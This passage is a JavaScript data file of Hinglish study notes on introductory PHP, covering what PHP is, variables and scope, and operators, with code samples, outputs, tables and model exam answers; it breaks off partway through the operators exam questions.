// ============================================================
// WEB TECHNOLOGY — Unit III, topics 3.1 to 3.4 (PHP part 1)
//  3.1 What is PHP  · 3.2 PHP variables  · 3.3 Operators
//  3.4 Taking user input and generating output
//
// PHP server par chalti hai, isliye in topics ka output panel
// PhpOutput component se render hota hai (section.php = stdout
// string). Koi fake live preview nahi.
// ============================================================

export const webTechnologyTopicsG = [
  // ==========================================================
  // 3.1 — What is PHP
  // ==========================================================
  {
    id: 'wt-php-intro',
    number: '3.1',
    title: 'What is PHP',
    subtitle: 'Server-side scripting language jo HTML ke andar chalti hai',
    icon: 'server',
    accent: '#8f9dc4',
    englishDefinition:
      'PHP (recursive acronym for PHP: Hypertext Preprocessor, originally "Personal Home Page Tools") is a free, open-source, server-side scripting language designed mainly for web development. PHP code is embedded inside HTML between <?php and ?> tags and is executed by the PHP interpreter on the web server, not in the browser. The script produces HTML (or JSON, XML, an image, a PDF) which the server sends to the client, so the visitor receives only the generated output and can never see the PHP source. PHP is cross-platform, supports almost every database (MySQL, PostgreSQL, SQLite, Oracle), handles forms, sessions, cookies, file uploads and e-mail, and runs about 75% of all websites with a known server-side language (WordPress, Laravel, Joomla, Wikipedia, Drupal). Current major version is PHP 8.x (8.3 used in these notes).',
    intro:
      'Ek line mein: HTML browser ko dikhane ke liye hoti hai, PHP server par kaam karne ke liye. Jab aap koi .php page kholte hain, server pehle us file mein likhi PHP script chalata hai, uske natije ko HTML mein badalta hai, aur wahi HTML aapke browser tak bhejta hai. Isliye page par "View Source" dabane par PHP code nahi dikhta — sirf uska output dikhta hai. Yahi ek baat exam mein poochhi jaati hai: PHP server-side hai, JavaScript client-side.',
    sections: [
      {
        type: 'definition',
        kicker: 'Definition',
        title: 'PHP kya hai?',
        body:
          'PHP = Hypertext Preprocessor, ek open-source server-side scripting language. File ka extension .php hota hai aur code <?php ... ?> tags ke andar likha jaata hai. Server par interpreter script chalata hai, output (usually HTML) browser ko bhejta hai. PHP ko chalane ke liye PHP interpreter + web server (Apache/Nginx) + database (MySQL) chahiye — XAMPP, LAMP aur WAMP inka ready bundle hain.',
        body2:
          'Itihaas: 1994 mein Rasmus Lerdorf ne "Personal Home Page Tools" banaye, 1995 mein PHP/FI, 1998 mein PHP 3, 2000 mein PHP 4 (Zend Engine), 2004 mein PHP 5 (OOP), 2015 mein PHP 7 (do guna tez), 2020 mein PHP 8 (JIT compiler, named arguments, match expression). Aaj PHP 8.3 chal raha hai.',
        chips: ['server-side', '<?php ... ?>', '.php', 'open source', 'Zend Engine', 'XAMPP', 'PHP 8.3'],
      },
      {
        type: 'diagram',
        kicker: 'Diagram (Exam Ke Liye)',
        title: 'PHP ka Safar — Browser se Database tak',
        diagram: 'php-request-flow',
        caption:
          'Browser .php file maangta hai → web server request PHP engine ko deta hai → engine script chalata hai (zaroorat par database se data leta hai) → sirf HTML output browser tak jaata hai. PHP code kabhi browser tak nahi jaata. Exam mein yahi 4-step figure likhna hai.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Pehla PHP Script — HTML ke Andar PHP',
        intro:
          'Dhyan dein: PHP tags ke bahar likha HTML bilkul waisa hi output mein chala jaata hai, aur tags ke andar wali PHP line chal kar apna result jod deti hai. Neeche jo output dikh raha hai, exactly wahi HTML browser ko milta hai — PHP source nahi.',
        language: 'php',
        filename: 'hello.php',
        code: `<!DOCTYPE html>
<html>
<head><title>My First PHP</title></head>
<body>
  <h1>Welcome to PHP</h1>

  <?php
    // ye line server par chalti hai
    echo "<p>Server time: " . date("d-m-Y") . "</p>";
  ?>

  <?php
    $course = "MCA";
    $marks  = 78;
  ?>

  <p>Course: <?= $course ?> · Marks: <?= $marks ?></p>
</body>
</html>`,
        php: `<!DOCTYPE html>
<html>
<head><title>My First PHP</title></head>
<body>
  <h1>Welcome to PHP</h1>

  <p>Server time: 05-11-2026</p>

  <p>Course: MCA · Marks: 78</p>
</body>
</html>`,
        label: 'php hello.php',
        height: 260,
        caption:
          'Brave karein: is page par "View Source" dabaiye — aapko sirf yahi HTML dikhega, echo/date/$course wali PHP lines kabhi nahi. Yahi PHP ka server-side hone ka proof hai (date server ki ghadi se aata hai).',
      },
      {
        type: 'comparison',
        kicker: 'Comparison Table',
        title: 'PHP vs Browser JavaScript vs Node.js',
        columns: ['PHP (server)', 'JavaScript (browser)', 'Node.js (server)'],
        columnColors: ['#8f9dc4', '#ffb86c', '#00ff88'],
        rows: [
          { label: 'Code chalta kahan', values: ['Server par (Apache + PHP)', 'User ke browser ke andar', 'Server par (Node runtime)'] },
          { label: 'Browser ko milta', values: ['Sirf HTML output', 'HTML + poora JS code', 'Response — HTML ya JSON'] },
          { label: 'View source', values: ['PHP code nahi dikhta', 'Poora JS code dikh jaata hai', 'Server code nahi dikhta'] },
          { label: 'Database access', values: ['Seedha (mysqli/PDO)', 'Seedha nahi — API se', 'Seedha (mysql2, Prisma)'] },
          { label: 'Typical use', values: ['Login, CMS, e-commerce', 'UI, animation, validation', 'REST API, chat, realtime'] },
        ],
      },
      {
        type: 'points',
        kicker: 'Exam Points',
        title: 'PHP Ki Features',
        points: [
          'Server-side scripting — code server par chalta hai, client ko sirf output milta hai (security ka fayda).',
          'HTML ke andar embed hoti hai — <?php ... ?> tags, aur <?= $var ?> short echo.',
          'Open source aur free — koi licence cost nahi, community bahut badi.',
          'Cross-platform — Windows, Linux, macOS; Apache, Nginx, IIS ke saath chalti hai.',
          'Database support — MySQL, PostgreSQL, SQLite, Oracle, MongoDB (PDO se ek hi code).',
          'Forms, sessions, cookies, file upload, e-mail — web ka poora kaam built-in.',
          'Speed — PHP 8 ka OPcache/JIT; WordPress, Laravel, Wikipedia isi par chalte hain.',
          'Limitation — desktop GUI nahi banti, interpreted hone ki wajah se compiled language se dheemi, loose typing se bugs aasani se aate hain.',
        ],
      },
      {
        type: 'recap',
        kicker: 'Recap',
        title: 'Quick Recap',
        points: [
          'PHP = Hypertext Preprocessor, server-side scripting language.',
          'Code <?php ?> ke andar, extension .php, output HTML bankar browser ko jaata hai.',
          'Client-server flow: browser → server → PHP engine → (database) → HTML → browser.',
          'Chalane ke liye XAMPP/LAMP/WAMP — interpreter + Apache + MySQL.',
          'PHP server-side hai, JavaScript client-side — yahi exam ka favourite difference hai.',
        ],
      },
    ],
    examQuestions: [
      {
        question: 'What is PHP? Explain its features and uses.',
        answer:
          '**Definition:** PHP (PHP: Hypertext Preprocessor) ek free, open-source, **server-side scripting language** hai jo mainly web development ke liye bani hai. PHP code HTML ke andar `<?php ... ?>` tags mein likha jaata hai aur web server par chal kar HTML output banata hai.\n\n**History:** 1994 Rasmus Lerdorf ("Personal Home Page Tools") → PHP 3 (1998) → PHP 4 (Zend Engine, 2000) → PHP 5 (OOP, 2004) → PHP 7 (2015, 2x fast) → PHP 8 (2020, JIT).\n\n**Features:**\n1. **Server-side** — code server par chalta hai, browser ko sirf output milta hai\n2. **HTML embedded** — `<?php ?>` tags, short echo `<?= ?>`\n3. **Open source & free**\n4. **Cross-platform** — Windows/Linux/macOS, Apache/Nginx/IIS\n5. **Database support** — MySQL, PostgreSQL, SQLite, Oracle (PDO/mysqli)\n6. **Built-in web features** — forms, sessions, cookies, file upload, mail\n7. **Fast** — OPcache + JIT (PHP 8)\n8. **Huge ecosystem** — WordPress, Laravel, Drupal, Wikipedia\n\n**Uses:** dynamic websites, login/signup systems, e-commerce, CMS (WordPress), REST APIs, form handling, report generation.\n\n**Limitations:** desktop GUI nahi, interpreted (compiled se dheemi), loose typing se silent bugs.\n\n**Exam line:** "PHP ek server-side scripting language hai jo HTML ke andar likhi jaati hai; server par chalti hai aur browser ko sirf HTML output bhejti hai."',
      },
      {
        question: 'Explain the working of PHP with a diagram. Why is PHP called a server-side language?',
        answer:
          '**Working (client-server model):**\n\n1. **Browser request** — user `http://site.com/hello.php` maangta hai\n2. **Web server** — Apache/Nginx request leta hai, extension `.php` dekh kar PHP interpreter ko deta hai\n3. **PHP engine** — script line-by-line chalata hai; zaroorat par **MySQL** se data laata hai\n4. **Output** — PHP HTML (ya JSON/image) banata hai\n5. **Response** — server wahi HTML browser ko bhejta hai; browser use render karta hai\n\n```\nBrowser  →  Web Server  →  PHP Engine  →  Database\n   ↑                                          |\n   └──────────  sirf HTML output  ←───────────┘\n```\n\n**Server-side kyon:**\n- Interpreter **server par** installed hota hai, browser ke paas PHP nahi hota\n- Browser ko sirf **generated HTML** milta hai, source code nahi\n- Isliye "View Source" mein PHP kabhi nahi dikhta — database password, logic sab safe\n- Client-side language (JavaScript) ka code browser tak jaata hai aur wahan chalta hai\n\n**Fayda:** security (logic chhupa rehta hai), database access, dynamic content, ek hi page har user ke liye alag output.\n\n**Diagram:** Refer to the PHP request-flow diagram.\n\n**Exam line:** "PHP server par interpret hoti hai aur client ko sirf HTML output milta hai, isliye ye server-side scripting language hai."',
      },
      {
        question: 'Write a PHP script to display "Hello World" and explain the syntax of a PHP program.',
        answer:
          '**Script:**\n```php\n<?php\necho "Hello World";\n?>\n```\n\n**Syntax ke parts:**\n\n| Part | Matlab |\n|---|---|\n| `<?php` | opening tag — iske baad PHP mode shuru |\n| `?>` | closing tag — wapas HTML mode |\n| `echo` | output print karne ka construct (language construct, function nahi) |\n| `"Hello World"` | string literal |\n| `;` | statement terminator — zaroori |\n| `//` `#` `/* */` | comments |\n\n**Variations:**\n```php\n<?php echo "Hello World"; ?>      // ek line\n<?= "Hello World" ?>              // short echo tag\n<?php print "Hello World"; ?>     // print bhi 1 hi value leta hai\n```\n\n**HTML ke saath:**\n```php\n<?php $name = "Riya"; ?>\n<h1>Hello <?= $name ?></h1>\n```\nOutput: `<h1>Hello Riya</h1>` — tags ke bahar ka HTML as-is jaata hai.\n\n**Rules:** file ka extension `.php`, statement ke aant mein `;`, variables `$` se shuru, tags ke bahar sab HTML.\n\n**Exam line:** "PHP code `<?php ?>` tags ke andar likha jaata hai; `echo` output print karta hai aur har statement `;` par khatam hoti hai."',
      },
    ],
  },

  // ==========================================================
  // 3.2 — PHP variables
  // ==========================================================
  {
    id: 'wt-php-variables',
    number: '3.2',
    title: 'PHP Variables',
    subtitle: '$ se shuru, type khud lag jaata hai, scope teen tarah ka',
    icon: 'tag',
    accent: '#00d4ff',
    englishDefinition:
      'A PHP variable is a named memory location that stores a value, written with a dollar sign followed by a valid name, for example $name, $total_marks or $_count. PHP is a loosely (dynamically) typed language: no type declaration is required, the type is decided automatically by the assigned value and can change later. Variable names must begin with a letter or underscore (not a digit), may contain letters, digits and underscores, and are case-sensitive ($Name and $name are different). PHP 8 supports eight primitive data types — bool, int, float, string, array, object, resource and NULL — plus pseudo-types callable, iterable and mixed. A value can be printed or inspected with echo, print_r or var_dump; gettype(), is_int(), settype() and casting check or change it. Scope is local (inside a function), global (outside any function) and static (a local variable that keeps its value between calls); a global variable is reachable inside a function only through the global keyword or the $GLOBALS array. PHP also provides superglobals — $GLOBALS, $_SERVER, $_GET, $_POST, $_FILES, $_COOKIE, $_SESSION, $_REQUEST and $_ENV — which are available everywhere without any declaration.',
    intro:
      'PHP variables mein sabse pehli aadat badalni padti hai: yahan type likhne ki zaroorat nahi. $x = 5; likha to $x integer ban gaya, baad mein $x = "paanch"; likh diya to wahi variable string ban jaayega. Naam ke aage $ lagana zaroori hai, aur naam case-sensitive hai. Exam ke liye teen cheezein yaad rakhein — naming rules, aath data types, aur scope (local/global/static + superglobals).',
    sections: [
      {
        type: 'definition',
        kicker: 'Definition',
        title: 'Variable kya hai aur naam kaise rakhein?',
        body:
          'Variable = memory ka naam wala dabba. PHP mein har variable $ se shuru hota hai: $name = "Riya";. Goshit (declare) karne ki zaroorat nahi — assign karte hi ban jaata hai, aur type value se tay hota hai (loosely typed). Naam letter ya underscore se shuru ho (digit se nahi), uske baad letters, digits, underscore chalte hain. Naam case-sensitive hai: $Name ≠ $name.',
        body2:
          'Value dekhne ke liye: echo (seedha print), print_r (array/object padhne ke liye), var_dump (type + length + value), gettype($x) (type ka naam). Type badalne ke liye casting: (int)$x, (float)$x, (string)$x, ya settype($x, "integer"). Check karne ke liye is_int(), is_string(), is_array(), isset() aur empty().',
        chips: ['$name', 'loose typing', 'case-sensitive', '8 data types', 'var_dump', 'scope', 'superglobals'],
      },
      {
        type: 'diagram',
        kicker: 'Diagram (Exam Ke Liye)',
        title: 'Variable ka Anatomy, Types aur Scope',
        diagram: 'php-variables',
        caption:
          'Ek line $studentName = "Riya"; ko tod kar dekhein — dollar sign, valid naam, =, value, ;. Neeche aath data types var_dump ke output ke saath, phir scope aur superglobals. Exam mein naming rules + types + scope likhne par poore marks.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Aath Data Types — var_dump Se Dekhein',
        intro:
          'var_dump() har value ke saath uska type aur (string ke liye) length bhi print karta hai — practical mein sabse zyada yahi use hota hai. Single quote aur double quote ka farak bhi dekh lein: double quote ke andar $name expand hota hai, single quote mein nahi.',
        language: 'php',
        filename: 'types.php',
        code: `<?php
$name  = "Riya";     // string
$age   = 22;         // integer
$cgpa  = 8.75;       // float
$pass  = true;       // boolean
$marks = [78, 82];   // array
$hobby = null;       // NULL
$file  = fopen("a.txt", "r");   // resource

echo "Name: $name, Age: $age\\n";
echo 'Single quote: $name expand nahi hota' . "\\n";

var_dump($name);
var_dump($age);
var_dump($cgpa);
var_dump($pass);
var_dump($marks);
var_dump($hobby);
echo get_resource_type($file) . "\\n";

echo gettype($cgpa) . "\\n";
$age = "ab string ho gaya";   // type badal sakta hai
echo gettype($age) . "\\n";`,
        php: `Name: Riya, Age: 22
Single quote: $name expand nahi hota
string(4) "Riya"
int(22)
float(8.75)
bool(true)
array(2) {
  [0]=>
  int(78)
  [1]=>
  int(82)
}
NULL
stream
double
string`,
        label: 'php types.php',
        height: 300,
        caption:
          'Dhyan dein: gettype() float ke liye "double" bolta hai (PHP mein dono ek hi hain), aur $age ko string assign karte hi uska type badal gaya — yahi loose typing hai.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Scope — Local, Global, Static aur Constants',
        intro:
          'Function ke andar ka variable bahar nahi dikhta. Global variable ko andar use karna ho to global keyword ya $GLOBALS. static variable function ke calls ke beech apni value yaad rakhta hai. Constant define() ya const se banta hai aur usme $ nahi lagta.',
        language: 'php',
        filename: 'scope.php',
        code: `<?php
$college = "SPPU";          // global

function showCollege() {
    // echo $college;        // ERROR: undefined variable
    global $college;          // ab global mil gaya
    echo "Global: $college\\n";
}

function showGlobals() {
    echo "GLOBALS se: " . $GLOBALS['college'] . "\\n";
}

function counter() {
    static $n = 0;            // call ke baad bhi yaad rehta hai
    $n++;
    return $n;
}

define("COURSE", "MCA");      // constant
const SEMESTER = 3;

showCollege();
showGlobals();

echo counter() . counter() . counter() . "\\n";
echo COURSE . " semester " . SEMESTER . "\\n";`,
        php: `Global: SPPU
GLOBALS se: SPPU
123
MCA semester 3`,
        label: 'php scope.php',
        height: 220,
        caption:
          'Teen counter() calls ne 1, 2, 3 return kiya — static $n har call ke baad apni value bachaata hai. Bina static ke har call mein 1 hi aata.',
      },
      {
        type: 'comparison',
        kicker: 'Comparison Table',
        title: 'Local vs Global vs Static',
        columns: ['Local', 'Global', 'Static'],
        columnColors: ['#00d4ff', '#c4ff00', '#ff7ab2'],
        rows: [
          { label: 'Kahan banta hai', values: ['Function ke andar', 'Script ke top level par', 'Function ke andar + static'] },
          { label: 'Kahan dikhta hai', values: ['Sirf usi function mein', 'Sirf function ke bahar', 'Sirf usi function mein'] },
          { label: 'Function khatam', values: ['Value khatam', 'Value rehti hai', 'Value rehti hai (agli call tak)'] },
          { label: 'Andar se access', values: ['Seedha', 'global $x ya $GLOBALS[\'x\']', 'Seedha (khud static hai)'] },
          { label: 'Kab use karein', values: ['Temporary calculation', 'Config, DB connection', 'Call counter, cache, memo'] },
        ],
      },
      {
        type: 'points',
        kicker: 'Exam Points',
        title: 'Variables Ke Rules aur Superglobals',
        points: [
          'Naam $ se shuru — $name, $total_marks, $_temp. Pehla character letter ya underscore, digit nahi.',
          'Case-sensitive: $name, $Name, $NAME teen alag variables hain.',
          'Type declare nahi karni padti — assign se type tay hota hai (loosely typed).',
          'Aath types: bool, int, float, string, array, object, resource, NULL.',
          'var_dump() type + value + length deta hai; echo sirf value.',
          'Scope: local, global, static. Global ko andar laane ke liye global keyword ya $GLOBALS.',
          'Constants: define("NAME", value) ya const NAME = value; — $ nahi lagta, dobara badal nahi sakte.',
          'Superglobals: $GLOBALS, $_SERVER, $_GET, $_POST, $_FILES, $_COOKIE, $_SESSION, $_REQUEST, $_ENV — har jagah available.',
          'Variable variables: $$name — $name ki value hi naye variable ka naam ban jaati hai.',
        ],
      },
      {
        type: 'recap',
        kicker: 'Recap',
        title: 'Quick Recap',
        points: [
          'Variable $ se shuru, case-sensitive, declare karne ki zaroorat nahi.',
          'Loose typing — type value se aata hai aur badal bhi sakta hai.',
          '8 data types; var_dump() se type ke saath value dekhein.',
          'Scope: local / global / static; global ke liye global keyword ya $GLOBALS.',
          'Superglobals ($_GET, $_POST, $_SESSION...) bina declare kiye har jagah milte hain.',
        ],
      },
    ],
    examQuestions: [
      {
        question: 'What is a variable in PHP? Explain the rules of naming a variable and its data types.',
        answer:
          '**Variable:** memory ka named location jisme value rakhi jaati hai; PHP mein `$` se shuru hota hai, jaise `$name = "Riya";`. Declaration ki zaroorat nahi — assignment se hi variable ban jaata hai.\n\n**Naming rules:**\n1. `$` se shuru hota hai\n2. Pehla character **letter ya underscore** ho (digit nahi)\n3. Aage letters, digits, underscore chalte hain (`$total_marks`, `$_temp`, `$x2`)\n4. **Case-sensitive** — `$name` ≠ `$Name`\n5. Space ya special character allowed nahi\n\n**Data types (8):**\n| Type | Example |\n|---|---|\n| int | `$age = 22;` |\n| float | `$cgpa = 8.75;` |\n| string | `$name = "Riya";` |\n| bool | `$pass = true;` |\n| array | `$m = [78, 82];` |\n| object | `$s = new Student();` |\n| resource | `fopen("a.txt","r")` |\n| NULL | `$x = null;` |\n\n**Type check:** `gettype($x)`, `is_int()`, `is_string()`, `var_dump($x)`.\n**Type change:** casting `(int)$x`, `(string)$x`, ya `settype($x, "float")`.\n\n**Note:** PHP loosely typed hai — ek hi variable ka type baad mein badal sakta hai.\n\n**Exam line:** "PHP variable `$` se shuru hota hai, case-sensitive hai, aur type declare nahi karni padti."',
      },
      {
        question: 'Explain the scope of variables in PHP with examples.',
        answer:
          '**Scope = variable kahan se dikhta hai.** PHP mein teen scope hain:\n\n**1. Local** — function ke andar bana variable sirf usi function mein dikhta hai:\n```php\nfunction f() {\n    $x = 10;   // local\n}\necho $x;       // error: undefined\n```\n\n**2. Global** — script ke top level par bana variable function ke andar dikhta nahi; use `global` keyword ya `$GLOBALS` se laate hain:\n```php\n$college = "SPPU";\nfunction show() {\n    global $college;\n    echo $college;            // SPPU\n    echo $GLOBALS["college"]; // SPPU\n}\n```\n\n**3. Static** — local variable jo function ke calls ke beech value yaad rakhta hai:\n```php\nfunction counter() {\n    static $n = 0;\n    $n++;\n    return $n;\n}\necho counter(); // 1\necho counter(); // 2\necho counter(); // 3\n```\n\n**Superglobals** — `$_GET`, `$_POST`, `$_SESSION`, `$_SERVER`, `$GLOBALS` etc. kisi bhi scope mein bina `global` ke milte hain.\n\n| Scope | Kahan dikhta | Lifetime |\n|---|---|---|\n| Local | usi function mein | function ke end tak |\n| Global | function ke bahar | script ke end tak |\n| Static | usi function mein | agli call tak |\n\n**Diagram:** Refer to the PHP variables diagram.\n\n**Exam line:** "Local function mein band rehta hai, global ko `global` keyword se andar laate hain, aur static apni value calls ke beech bachaata hai."',
      },
      {
        question: 'What are superglobal variables in PHP? List them with their use.',
        answer:
          '**Superglobals** = predefined global arrays jo script ki **kisi bhi jagah** (function ke andar bhi) bina `global` declare kiye available hote hain. PHP inhe automatically bharta hai.\n\n| Superglobal | Kaam |\n|---|---|\n| `$GLOBALS` | saare global variables ka array |\n| `$_SERVER` | server + request info (SCRIPT_NAME, REQUEST_METHOD, HTTP_HOST, PHP_SELF) |\n| `$_GET` | URL ke query string se aaya data |\n| `$_POST` | form ke POST body se aaya data |\n| `$_REQUEST` | GET + POST + COOKIE ka mix |\n| `$_FILES` | upload ki gayi files ka info |\n| `$_COOKIE` | browser ki bheji cookies |\n| `$_SESSION` | server par stored session data |\n| `$_ENV` | environment variables |\n\n**Example:**\n```php\n// form: <input name="name">\n$name = $_POST["name"] ?? "";\necho htmlspecialchars($name);\n```\n\n**Dhyan:** superglobals mein user ka data aata hai, isliye use **kabhi seedha echo na karein** — `htmlspecialchars()` se escape karein aur `isset()` / `filter_var()` se validate karein.\n\n**Diagram:** Refer to the PHP variables diagram (superglobals strip).\n\n**Exam line:** "Superglobals predefined arrays hain — $_GET, $_POST, $_SESSION, $_SERVER — jo har scope mein bina declare kiye available hote hain."',
      },
    ],
  },

  // ==========================================================
  // 3.3 — Operators
  // ==========================================================
  {
    id: 'wt-php-operators',
    number: '3.3',
    title: 'PHP Operators',
    subtitle: 'Chhe group — arithmetic se lekar comparison tak',
    icon: 'zap',
    accent: '#ff8800',
    englishDefinition:
      'An operator is a symbol that performs an operation on one or more operands (values or variables) and returns a result; PHP divides them into arithmetic (+, -, *, /, %, ** and intdiv()), assignment (=, +=, -=, *=, /=, %=, **=, .=), comparison (==, ===, !=, <>, !==, <, >, <=, >=, <=>, ??), logical (&&, ||, !, and, or, xor), increment/decrement (++$a, $a++, --$a, $a--), string (. and .=) and bitwise (&, |, ^, ~, <<, >>) groups, plus the conditional (ternary) operator ?:, the null coalescing operator ??, the error control operator @ and the array operators (+, ==, ===, !=, <>). Two differences matter in exams: . joins strings (not +), and == compares only values after type juggling while === compares value and type, so "10" == 10 is true but "10" === 10 is false. Operator precedence decides evaluation order — arithmetic before ., comparison before logical, and parentheses always win.',
    intro:
      'Operators to naam se hi samajh aate hain — jodna, ghatana, compare karna, check karna. PHP mein do jagah log phansate hain. Pehla: string jodne ke liye + nahi, dot (.) lagta hai, kyunki + sirf numbers ka hai. Doosra: == value dekhta hai, === value ke saath type bhi — isliye "10" == 10 true hai par "10" === 10 false. Exam mein yahi do traps poochhe jaate hain.',
    sections: [
      {
        type: 'definition',
        kicker: 'Definition',
        title: 'Operator aur Operand',
        body:
          'Operator = symbol jo value par kaam karta hai; operand = wo value jis par kaam hota hai. $a + $b mein + operator hai, $a aur $b operands. PHP mein chhe main groups: arithmetic (+, -, *, /, %, **), assignment (=, +=, .=), comparison (==, ===, !=, <, >, <=>), logical (&&, ||, !, and, or, xor), increment/decrement (++/--) aur string (.).',
        body2:
          'Precedence (kaun pehle chalega): ** → ++/-- → ! → * / % → + - → . → comparison → && → || → ?? → assignment. Confusion ho to bracket lagaiye — bracket hamesha jeetta hai. Ternary $c ? $x : $y ek line ka if-else hai, aur ?? sirf null hone par doosri value deta hai.',
        chips: ['arithmetic', 'assignment', 'comparison', 'logical', 'increment', 'string .', '== vs ==='],
      },
      {
        type: 'diagram',
        kicker: 'Diagram (Exam Ke Liye)',
        title: 'Chhe Operator Groups — Ek Nazar Mein',
        diagram: 'php-operators',
        caption:
          'Har group ke saath ek chhota example. Neeche wala orange strip exam ka trap batata hai: "10" == 10 true, "10" === 10 false. Figure + ek line explanation = poore marks.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'Arithmetic, Assignment aur Comparison',
        intro:
          'Neeche har line ka output comment mein bhi likha hai. var_export() boolean ko "true"/"false" text ki tarah dikhata hai, isliye comparison ka natija saaf padha ja sakta hai.',
        language: 'php',
        filename: 'operators.php',
        code: `<?php
$a = 10;
$b = 3;

echo $a + $b . "\\n";        // 13
echo $a - $b . "\\n";        // 7
echo $a * $b . "\\n";        // 30
echo $a / 4 . "\\n";         // 2.5  (division float deta hai)
echo intdiv($a, 4) . "\\n";  // 2    (poora hissa)
echo $a % $b . "\\n";        // 1    (remainder)
echo $a ** 2 . "\\n";        // 100  (power)

// assignment shortcuts
$total = 100;
$total += 20;                // 120
$total -= 5;                 // 115
$total *= 2;                 // 230
echo $total . "\\n";

// comparison — value vs value + type
var_dump("10" == 10);        // true  (type juggling)
var_dump("10" === 10);       // false (type alag)
var_dump(10 <=> 20);         // -1
var_dump(20 <=> 10);         // 1
var_dump(10 <=> 10);         // 0`,
        php: `13
7
30
2.5
2
1
100
230
bool(true)
bool(false)
int(-1)
int(1)
int(0)`,
        label: 'php operators.php',
        height: 300,
        caption:
          'Exam ka favourite: "10" == 10 → true, par "10" === 10 → false. Password/ID compare karte waqt hamesha === use karein.',
      },
      {
        type: 'codeoutput',
        kicker: 'Code + Output',
        title: 'String, Increment, Logical aur Ternary',
        intro:
          'String jodne ke liye dot, aur barabar-ke-saath-dot (.=) se string append hoti hai. $i++ pehle value deta hai phir badhaata hai; ++$i pehle badhaata hai phir value deta hai.',
        language: 'php',
        filename: 'operators2.php',
        code: `<?php
$s = "PHP";
$s .= " 8";                  // append
echo $s . "\\n";             // PHP 8

$i = 5;
echo $i++ . "\\n";           // 5  (pehle print, phir 6)
echo $i . "\\n";             // 6
echo ++$i . "\\n";           // 7  (pehle 7, phir print)
echo $i-- . "\\n";           // 7
echo $i . "\\n";             // 6

$age = 20;
$ok  = ($age >= 18 && $age <= 60);
echo $ok ? "eligible" : "not eligible";
echo "\\n";

$user = null;
echo ($user ?? "Guest") . "\\n";   // null tha, Guest aaya

$role = "admin";
echo ($role === "admin") ? "full access" : "limited";
echo "\\n";`,
        php: `PHP 8
5
6
7
7
6
eligible
Guest
full access`,
        label: 'php operators2.php',
        height: 250,
        caption:
          'Increment/decrement ka farak: $i++ → "pehle do, phir badhao", ++$i → "pehle badhao, phir do". Loop ke andar dono ka natija same lagta hai, par expression mein farak pad jaata hai.',
      },
      {
        type: 'comparison',
        kicker: 'Comparison Table',
        title: '== vs === aur + vs .',
        columns: ['== (equal)', '=== (identical)', '. (concat)'],
        columnColors: ['#ff8800', '#00ff88', '#00d4ff'],
        rows: [
          { label: 'Kya check karta', values: ['Sirf value (type badal kar)', 'Value + type dono', 'Do strings jodta hai'] },
          { label: 'Example', values: ['"10" == 10 → true', '"10" === 10 → false', '"PHP" . " 8" → PHP 8'] },
          { label: 'Khatra', values: ['0 == "apple" purane PHP mein true (PHP 8 mein false)', 'Koi nahi — safest', '+ se number jodne ki galti'] },
          { label: 'Kab use karein', values: ['Sirf number compare', 'Login, ID, password, type-critical', 'Har string output/join'] },
        ],
      },
      {
        type: 'points',
        kicker: 'Exam Points',
        title: 'Operators Ke Points',
        points: [
          'Chhe groups: arithmetic, assignment, comparison, logical, increment/decrement, string.',
          'Division (/) hamesha float deta hai; poora hissa chahiye to intdiv(); remainder ke liye %.',
          'String join karne ke liye . aur .= — + sirf numbers ke liye hai.',
          '== value compare karta hai, === value + type. Loose comparison se bachein.',
          '<=> spaceship: chhota -1, barabar 0, bada 1.',
          '?? null coalescing — variable set na ho ya null ho to default value.',
          'Ternary $c ? $x : $y — chhota if-else.',
          'Precedence: ** → * / % → + - → . → comparison → && → || → assignment; bracket se override.',
          'Logical mein && / || ki priority and / or se zyada hoti hai (dono kaam same, sirf precedence alag).',
        ],
      },
      {
        type: 'recap',
        kicker: 'Recap',
        title: 'Quick Recap',
        points: [
          'Operator value par kaam karke result deta hai; operand wo value hai.',
          'Arithmetic: + - * / % **; division float, intdiv() poora.',
          'String jodne ke liye dot (.), + nahi.',
          '== sirf value, === value + type (safest).',
          '++$a pehle badhao, $a++ pehle use karo.',
          '?? default value deta hai, ternary chhota if-else.',
        ],
      },
    ],
    examQuestions: [
      {
        question: 'What are operators in PHP? Explain the types of operators with examples.',
        answer:
          '**Operator:** symbol jo operands par operation karke result deta hai (jaise `$a + $b` mein `+`).\n\n**Types:**\n\n**1. Arithmetic** — `+ - * / % **`\n```php\necho 10 + 3;   // 13\necho 10 % 3;   // 1\necho 10 ** 2;  // 100\necho intdiv(10, 4); // 2\n```\n\n**2. Assignment** — `= += -= *= /= %= .=`\n```php\n$t = 100; $t += 20;  // 120\n$s = "PHP"; $s .= " 8"; // PHP 8\n```\n\n**3. Comparison** — `== === != <> !== < > <= >= <=>`\n```php\nvar_dump("10" == 10);  // true\nvar_dump("10" === 10); // false\n```\n\n**4. Logical** — `&& || ! and or xor`\n```php\n($age >= 18 && $age <= 60)\n```\n\n**5. Increment / Decrement** — `++ --`\n```php\n$i = 5; echo $i++; // 5 (phir 6)\necho ++$i;         // 7\n```\n\n**6. String** — `.` aur `.=`\n```php\n"Hello" . " " . "Riya"   // Hello Riya\n```\n\n**Extra:** ternary `? :`, null coalescing `??`, error control `@`, bitwise `& | ^ ~ << >>`.\n\n**Diagram:** Refer to the PHP operators diagram.\n\n**Exam line:** "PHP mein arithmetic, assignment, comparison, logical, increment aur string — chhe main operator groups hain."',
      },
      {
        question: 'Differentiate between == and === with examples. Why is === preferred?',
        answer:
